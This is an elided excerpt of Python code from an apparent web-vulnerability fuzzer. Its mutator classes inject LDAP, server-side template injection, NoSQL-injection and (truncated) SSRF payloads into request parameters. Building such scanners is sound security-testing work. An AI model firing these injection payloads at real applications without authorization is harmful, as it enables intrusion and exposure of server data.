...
class LDAPInjectionParamMutator(ParamMutator):
    def mutate(self, string):
        if random.random() < 0.05:
            payload = "*"
        else:
...
class ServerSideTemplateInjectionParamMutator(ParamMutator):
    def mutate(self, string):
        if random.random() < 0.05:
            ...
            payload = "#{99901*99991}"              # Thymeleaf
        elif random.random() < 0.05:
            payload = "{{99901*'99991'}}"           # Twig, Jinja2
        elif random.random() < 0.05:
            payload = "{{dump(app)}}"
        elif random.random() < 0.05:
            payload = "%7B%7Bdump%28app%29%7D%7D"
        else:
            return None
        
        return payload
    
class ServerSideRequestForgeryParamMutator(ParamMutator):
    def mutate(self, string):
        if random.random() < 0.05:
...
class NoSQLInjectionParamMutator(ParamMutator):
    def mutate(self, string):
        if random.random() < 0.05:
            payload = '{"$ne":null}'
        elif random.random() < 0.05:
